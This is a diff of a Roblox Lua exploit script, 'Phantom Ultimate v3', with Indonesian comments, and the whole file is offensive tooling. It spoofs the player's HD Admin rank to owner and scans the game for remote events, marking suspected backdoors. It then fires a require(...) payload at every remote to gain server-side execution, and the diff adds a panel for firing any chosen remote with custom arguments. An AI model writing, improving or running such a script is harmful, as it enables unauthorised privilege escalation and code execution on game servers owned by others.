@@ -1,4 +1,4 @@
--- [[ PHANTOM ULTIMATE v3: FINAL AUTO-SWITCH EDITION ]] --
+-- [[ PHANTOM ULTIMATE v3: INTEGRATED EDITION (AUTO-ENGINE) ]] --
 local RunService = game:GetService("RunService")
 local CoreGui = game:GetService("CoreGui")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -9,174 +9,262 @@ local lp = Players.LocalPlayer
 
 local isRunning = false
 local currentTask = nil
+local selectedRemote = nil
 
--- Cleanup GUI lama
-if CoreGui:FindFirstChild("PhantomFinal_V3") then CoreGui.PhantomFinal_V3:Destroy() end
+-- Hapus GUI lama agar tidak double
+if CoreGui:FindFirstChild("PhantomIntegrated_V3") then
+    CoreGui.PhantomIntegrated_V3:Destroy()
+end
 
 -- [[ UI CONSTRUCTION ]] --
 local ScreenGui = Instance.new("ScreenGui", CoreGui)
-ScreenGui.Name = "PhantomFinal_V3"
+ScreenGui.Name = "PhantomIntegrated_V3"
 ScreenGui.ResetOnSpawn = false
 
 local Main = Instance.new("Frame", ScreenGui)
-Main.Size = UDim2.new(0, 300, 0, 380) 
-Main.Position = UDim2.new(0.5, -150, 0.5, -190)
+Main.Size = UDim2.new(0, 300, 0, 450) 
+Main.Position = UDim2.new(0.5, -150, 0.4, -225)
 Main.BackgroundColor3 = Color3.fromRGB(15, 20, 30)
 Main.BorderSizePixel = 0
-Main.Visible = false -- Mulai dalam keadaan tersembunyi, buka lewat Icon
+Main.Visible = true
 Instance.new("UICorner", Main)
 local Stroke = Instance.new("UIStroke", Main)
 Stroke.Color = Color3.fromRGB(85, 255, 127)
+Stroke.Thickness = 2
 
--- [[ HEADER & SWITCH ]] --
-local Header = Instance.new("Frame", Main)
-Header.Size = UDim2.new(1, 0, 0, 50)
-Header.BackgroundTransparency = 1
-
-local Title = Instance.new("TextLabel", Header)
-Title.Size = UDim2.new(0.6, 0, 1, 0)
-Title.Position = UDim2.new(0.05, 0, 0, 0)
-Title.Text = "SYSTEM: STANDBY"
-Title.TextColor3 = Color3.fromRGB(200, 200, 200)
+-- [[ HEADER ]] --
+local Title = Instance.new("TextLabel", Main)
+Title.Size = UDim2.new(1, 0, 0, 40)
+Title.Text = "PHANTOM ULTIMATE: INTEGRATED"
+Title.TextColor3 = Color3.new(1,1,1)
 Title.Font = Enum.Font.GothamBold
-Title.TextSize = 11
-Title.TextXAlignment = Enum.TextXAlignment.Left
+Title.TextSize = 12
 Title.BackgroundTransparency = 1
 
-local SwitchBG = Instance.new("Frame", Header)
-SwitchBG.Size = UDim2.new(0, 60, 0, 26)
-SwitchBG.Position = UDim2.new(0.75, 0, 0.5, -13)
-SwitchBG.BackgroundColor3 = Color3.fromRGB(30, 35, 45)
+--- --- --- --- --- ---
+-- [[ 1. AUTO-ENGINE SWITCH ]] --
+--- --- --- --- --- ---
+local EngineFrame = Instance.new("Frame", Main)
+EngineFrame.Size = UDim2.new(0.9, 0, 0, 40)
+EngineFrame.Position = UDim2.new(0.05, 0, 0.1, 0)
+EngineFrame.BackgroundColor3 = Color3.fromRGB(25, 30, 45)
+Instance.new("UICorner", EngineFrame)
+
+local EngineLabel = Instance.new("TextLabel", EngineFrame)
+EngineLabel.Size = UDim2.new(0.6, 0, 1, 0)
+EngineLabel.Position = UDim2.new(0.05, 0, 0, 0)
+EngineLabel.Text = "AUTO-ENGINE STATUS"
+EngineLabel.TextColor3 = Color3.new(0.8, 0.8, 0.8)
+EngineLabel.Font = Enum.Font.GothamBold
+EngineLabel.TextSize = 10
+EngineLabel.BackgroundTransparency = 1
+EngineLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+local SwitchBG = Instance.new("Frame", EngineFrame)
+SwitchBG.Size = UDim2.new(0, 50, 0, 22)
+SwitchBG.Position = UDim2.new(0.75, 0, 0.5, -11)
+SwitchBG.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
 Instance.new("UICorner", SwitchBG).CornerRadius = UDim.new(1, 0)
 
 local SwitchDot = Instance.new("TextButton", SwitchBG)
-SwitchDot.Size = UDim2.new(0, 22, 0, 22)
-SwitchDot.Position = UDim2.new(0.05, 0, 0.5, -11)
-SwitchDot.BackgroundColor3 = Color3.fromRGB(255, 85, 85) -- Red OFF
+SwitchDot.Size = UDim2.new(0, 18, 0, 18)
+SwitchDot.Position = UDim2.new(0.1, 0, 0.5, -9)
+SwitchDot.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
 SwitchDot.Text = ""
 Instance.new("UICorner", SwitchDot).CornerRadius = UDim.new(1, 0)
 
--- [[ PROGRESS BAR ]] --
-local BarBG = Instance.new("Frame", Main)
-BarBG.Size = UDim2.new(0.9, 0, 0, 6)
-BarBG.Position = UDim2.new(0.05, 0, 0.15, 0)
-BarBG.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
-Instance.new("UICorner", BarBG)
+--- --- --- --- --- ---
+-- [[ 2. REMOTE LIST & LOGGER ]] --
+--- --- --- --- --- ---
+local Scroll = Instance.new("ScrollingFrame", Main)
+Scroll.Size = UDim2.new(0.9, 0, 0, 100)
+Scroll.Position = UDim2.new(0.05, 0, 0.22, 0)
+Scroll.BackgroundColor3 = Color3.fromRGB(10, 12, 18)
+Scroll.BorderSizePixel = 0
+Scroll.ScrollBarThickness = 2
+local ListLayout = Instance.new("UIListLayout", Scroll)
+ListLayout.Padding = UDim.new(0, 4)
 
-local BarFill = Instance.new("Frame", BarBG)
-BarFill.Size = UDim2.new(0, 0, 1, 0)
-BarFill.BackgroundColor3 = Color3.fromRGB(85, 255, 127)
-Instance.new("UICorner", BarFill)
-
--- [[ LOG WINDOW ]] --
 local LogFrame = Instance.new("ScrollingFrame", Main)
-LogFrame.Size = UDim2.new(0.9, 0, 0.7, 0)
-LogFrame.Position = UDim2.new(0.05, 0, 0.22, 0)
+LogFrame.Size = UDim2.new(0.9, 0, 0, 70)
+LogFrame.Position = UDim2.new(0.05, 0, 0.47, 0)
 LogFrame.BackgroundColor3 = Color3.fromRGB(5, 5, 10)
 LogFrame.BorderSizePixel = 0
 LogFrame.ScrollBarThickness = 2
 local LogList = Instance.new("UIListLayout", LogFrame)
 
-local function AddLog(text, color, progress)
+local function AddLog(text, color)
     local l = Instance.new("TextLabel", LogFrame)
-    l.Size = UDim2.new(1, -10, 0, 18)
+    l.Size = UDim2.new(1, -10, 0, 16)
     l.BackgroundTransparency = 1
-    l.Text = "> " .. text
-    l.TextColor3 = color or Color3.new(1,1,1)
+    l.Text = "[" .. os.date("%X") .. "] " .. text
+    l.TextColor3 = color or Color3.new(1, 1, 1)
     l.Font = Enum.Font.Code
-    l.TextSize = 10
+    l.TextSize = 9
     l.TextXAlignment = Enum.TextXAlignment.Left
-    
-    if progress then
-        BarFill:TweenSize(UDim2.new(progress, 0, 1, 0), "Out", "Quad", 0.3, true)
-    end
     LogFrame.CanvasSize = UDim2.new(0, 0, 0, LogList.AbsoluteContentSize.Y)
     LogFrame.CanvasPosition = Vector2.new(0, LogList.AbsoluteContentSize.Y)
 end
 
--- [[ AUTOMATION ENGINE ]] --
-local function StartAutomation()
-    isRunning = true
-    AddLog("Initializing Phantom Engine...", Color3.new(1,1,0), 0.1)
-    Title.Text = "SYSTEM: RUNNING"
-    Title.TextColor3 = Color3.fromRGB(85, 255, 127)
+--- --- --- --- --- ---
+-- [[ 3. MANUAL EXECUTION ]] --
+--- --- --- --- --- ---
+local ArgInput = Instance.new("TextBox", Main)
+ArgInput.Size = UDim2.new(0.9, 0, 0, 30)
+ArgInput.Position = UDim2.new(0.05, 0, 0.66, 0)
+ArgInput.BackgroundColor3 = Color3.fromRGB(20, 25, 35)
+ArgInput.PlaceholderText = "Argument (String/Boolean)"
+ArgInput.Text = ""
+ArgInput.TextColor3 = Color3.white
+ArgInput.TextSize = 10
+Instance.new("UICorner", ArgInput)
 
-    -- 1. Rank Spoofing
-    if not isRunning then return end
-    AddLog("Scanning for HD Admin...", Color3.new(1,1,1), 0.2)
+local ExecBtn = Instance.new("TextButton", Main)
+ExecBtn.Size = UDim2.new(0.9, 0, 0, 35)
+ExecBtn.Position = UDim2.new(0.05, 0, 0.75, 0)
+ExecBtn.BackgroundColor3 = Color3.fromRGB(85, 255, 127)
+ExecBtn.Text = "FIRE SELECTED REMOTE"
+ExecBtn.TextColor3 = Color3.fromRGB(15, 20, 30)
+ExecBtn.Font = Enum.Font.GothamBold
+Instance.new("UICorner", ExecBtn)
+
+-- [[ SCANNER LOGIC ]] --
+local function addRemoteItem(remote, isBackdoor)
+    local Frame = Instance.new("Frame", Scroll)
+    Frame.Size = UDim2.new(1, -6, 0, 30)
+    Frame.BackgroundColor3 = isBackdoor and Color3.fromRGB(45, 20, 20) or Color3.fromRGB(25, 30, 40)
+    Instance.new("UICorner", Frame)
+
+    local btn = Instance.new("TextButton", Frame)
+    btn.Size = UDim2.new(1, 0, 1, 0)
+    btn.BackgroundTransparency = 1
+    btn.Text = "  " .. (isBackdoor and "[BD] " or "") .. remote.Name
+    btn.TextColor3 = isBackdoor and Color3.fromRGB(255, 100, 100) or Color3.new(0.8, 0.8, 0.8)
+    btn.Font = Enum.Font.SourceSansBold
+    btn.TextSize = 11
+    btn.TextXAlignment = Enum.TextXAlignment.Left
+
+    btn.MouseButton1Click:Connect(function()
+        selectedRemote = remote
+        Title.Text = "READY: " .. remote.Name:upper()
+        AddLog("Selected: " .. remote.Name, Color3.fromRGB(255, 255, 255))
+    end)
+end
+
+local function ScanAll()
+    for _, c in pairs(Scroll:GetChildren()) do if c:IsA("Frame") then c:Destroy() end end
+    AddLog("Scanning Remotes...", Color3.fromRGB(255, 255, 100))
+    
+    for _, v in pairs(ReplicatedStorage:GetDescendants()) do
+        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then addRemoteItem(v, false) end
+    end
+    
+    local locs = {JointService, game:GetService("LogService")}
+    for _, loc in pairs(locs) do
+        pcall(function()
+            for _, v in pairs(loc:GetDescendants()) do
+                if v:IsA("RemoteEvent") then addRemoteItem(v, true) end
+            end
+        end)
+    end
+    Scroll.CanvasSize = UDim2.new(0, 0, 0, ListLayout.AbsoluteContentSize.Y)
+end
+
+-- [[ AUTOMATION ENGINE LOGIC ]] --
+local function StartAutomation()
+    AddLog("Engine: Initializing...", Color3.new(1,1,0))
+    
+    -- Rank Spoofing
     pcall(function()
         if _G.HDAdminMain then
             _G.HDAdminMain.pd[lp].Rank = 5
-            AddLog("Rank Spoofed: OWNER (5)", Color3.fromRGB(85, 255, 127), 0.4)
+            AddLog("Engine: HD Admin Spoofed!", Color3.fromRGB(85, 255, 127))
         end
     end)
     task.wait(0.5)
 
-    -- 2. Remote Scanning
-    if not isRunning then return end
-    AddLog("Gathering Remote Targets...", Color3.new(1,1,1), 0.6)
+    -- Payload Delivery
     local targets = {}
     for _, v in pairs(ReplicatedStorage:GetDescendants()) do
         if v:IsA("RemoteEvent") then table.insert(targets, v) end
     end
-    for _, loc in pairs({JointService, game:GetService("LogService")}) do
-        pcall(function()
-            for _, v in pairs(loc:GetDescendants()) do if v:IsA("RemoteEvent") then table.insert(targets, v) end end
-        end)
-    end
-
-    -- 3. Payload Injection
-    if not isRunning then return end
-    AddLog("Injecting " .. #targets .. " Remotes...", Color3.new(255, 85, 85), 0.8)
+    
+    AddLog("Engine: Injecting " .. #targets .. " Remotes", Color3.new(1, 0.5, 0))
     local payload = "require(5021815801):Fire('" .. lp.Name .. "')"
     
     for i, v in pairs(targets) do
         if not isRunning then break end
-        pcall(function() v:FireServer(payload); v:FireServer(true) end)
-        if i % 10 == 0 then task.wait(0.05) end
+        pcall(function() 
+            v:FireServer(payload)
+            v:FireServer(true) 
+        end)
+        if i % 15 == 0 then task.wait(0.1) end
     end
 
     if isRunning then
-        AddLog("AUTO-INJECTION COMPLETED", Color3.fromRGB(85, 255, 127), 1)
+        AddLog("Engine: Injection Complete", Color3.fromRGB(85, 255, 127))
         Title.Text = "SYSTEM: COMPLETED"
     end
 end
 
--- [[ SWITCH LOGIC ]] --
+-- [[ TOGGLE ENGINE ]] --
 SwitchDot.MouseButton1Click:Connect(function()
     if not isRunning then
         isRunning = true
-        SwitchDot:TweenPosition(UDim2.new(0.6, 0, 0.5, -11), "Out", "Quad", 0.2, true)
+        SwitchDot:TweenPosition(UDim2.new(0.6, 0, 0.5, -9), "Out", "Back", 0.3, true)
         SwitchDot.BackgroundColor3 = Color3.fromRGB(85, 255, 127)
+        Title.Text = "PHANTOM: ENGINE ACTIVE"
         currentTask = task.spawn(StartAutomation)
     else
         isRunning = false
         if currentTask then task.cancel(currentTask) end
-        SwitchDot:TweenPosition(UDim2.new(0.05, 0, 0.5, -11), "Out", "Quad", 0.2, true)
-        SwitchDot.BackgroundColor3 = Color3.fromRGB(255, 85, 85)
-        Title.Text = "SYSTEM: STANDBY"
-        Title.TextColor3 = Color3.fromRGB(200, 200, 200)
-        BarFill.Size = UDim2.new(0, 0, 1, 0)
-        AddLog("Operation Aborted", Color3.new(1, 0.5, 0), 0)
+        SwitchDot:TweenPosition(UDim2.new(0.1, 0, 0.5, -9), "Out", "Back", 0.3, true)
+        SwitchDot.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+        Title.Text = "PHANTOM: ENGINE STOPPED"
+        AddLog("Engine: Terminated", Color3.new(1, 0, 0))
     end
 end)
 
--- [[ ICON PH & DRAG ]] --
+-- [[ REFRESH BUTTON ]] --
+local ScanBtn = Instance.new("TextButton", Main)
+ScanBtn.Size = UDim2.new(0.9, 0, 0, 30)
+ScanBtn.Position = UDim2.new(0.05, 0, 0.88, 0)
+ScanBtn.BackgroundColor3 = Color3.fromRGB(40, 45, 55)
+ScanBtn.Text = "REFRESH & SCAN LIST"
+ScanBtn.TextColor3 = Color3.white
+ScanBtn.Font = Enum.Font.GothamBold
+Instance.new("UICorner", ScanBtn)
+ScanBtn.MouseButton1Click:Connect(ScanAll)
+
+-- [[ EXECUTION LOGIC ]] --
+ExecBtn.MouseButton1Click:Connect(function()
+    if selectedRemote then
+        local val = ArgInput.Text
+        if val == "true" then val = true elseif val == "false" then val = false end
+        pcall(function()
+            if selectedRemote:IsA("RemoteEvent") then
+                selectedRemote:FireServer(val)
+            elseif selectedRemote:IsA("RemoteFunction") then
+                selectedRemote:InvokeServer(val)
+            end
+        end)
+        AddLog("Manual: Executed " .. selectedRemote.Name, Color3.fromRGB(85, 255, 127))
+    else
+        AddLog("Error: Select a remote first!", Color3.fromRGB(255, 100, 100))
+    end
+end)
+
+-- [[ UTILS & DRAG ]] --
 local OpenBtn = Instance.new("TextButton", ScreenGui)
-OpenBtn.Name = "ToggleIcon"
-OpenBtn.Size = UDim2.new(0, 50, 0, 50)
-OpenBtn.Position = UDim2.new(0, 20, 0.5, -25)
+OpenBtn.Size = UDim2.new(0, 45, 0, 45)
+OpenBtn.Position = UDim2.new(0, 20, 0.5, -22)
 OpenBtn.BackgroundColor3 = Color3.fromRGB(15, 20, 30)
 OpenBtn.Text = "PH"
 OpenBtn.TextColor3 = Color3.fromRGB(85, 255, 127)
 OpenBtn.Font = Enum.Font.GothamBold
-OpenBtn.TextSize = 14
 Instance.new("UICorner", OpenBtn).CornerRadius = UDim.new(1, 0)
 Instance.new("UIStroke", OpenBtn).Color = Color3.fromRGB(85, 255, 127)
-
-OpenBtn.MouseButton1Click:Connect(function()
-    Main.Visible = not Main.Visible
-end)
+OpenBtn.MouseButton1Click:Connect(function() Main.Visible = not Main.Visible end)
 
 local function makeDraggable(obj)
     local dragging, dragInput, dragStart, startPos
@@ -199,7 +287,6 @@ local function makeDraggable(obj)
     end)
 end
 
-makeDraggable(Main)
-makeDraggable(OpenBtn)
-
-AddLog("Phantom Engine Ready. Use icon to open.", Color3.new(0.6,0.6,0.6))
+makeDraggable(Main); makeDraggable(OpenBtn)
+ScanAll()
+AddLog("Phantom Integrated V3 Loaded.", Color3.fromRGB(85, 255, 127))
